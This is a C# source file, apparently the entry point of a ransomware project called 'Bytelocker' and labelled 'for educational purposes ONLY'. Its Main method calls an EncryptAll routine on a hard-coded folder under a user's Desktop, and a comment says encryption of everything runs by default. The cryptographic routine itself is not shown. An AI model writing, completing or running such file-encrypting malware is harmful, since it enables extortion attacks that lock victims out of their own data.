using Bytelocker.CryptoManager;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*
 * Created for educational purposes ONLY
 * 
 */
namespace Bytelocker
{
    class Bytelocker
    {

        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static String PATH_TO_ENCRYPT = @"C:\Users\nic\Desktop\New folder";

        public static void Main(String[] args)
        {
            CryptoManagerMainHandler cs = new CryptoManagerMainHandler();
            cs.EncryptAll(PATH_TO_ENCRYPT);

            // if ui has not been opened, run encrypt all
                
        }
    }
}
